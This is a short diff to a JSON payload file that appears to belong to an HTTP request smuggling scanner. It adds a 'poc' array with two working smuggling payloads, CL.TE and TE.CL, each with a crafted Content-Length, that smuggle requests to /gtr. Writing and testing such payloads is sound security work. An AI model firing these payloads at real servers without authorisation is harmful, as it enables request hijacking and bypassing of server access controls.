@@ -316,5 +316,17 @@
 			"payload": "\r\n0\r\n\r\n\r\nG",
 			"content_length": 6
 		}
+	],
+	"poc": [
+		{
+			"type": "CL.TE",
+			"payload": "\r\n0\r\n\r\nGET /gtr HTTP/1.1\r\nFoo: X",
+			"content_length": 30
+            },
+		{
+			"type": "TE.CL",
+			"payload": "\r\n2d\r\nPOST /gtr HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
+			"content_length": 4
+            }
 	]
 }
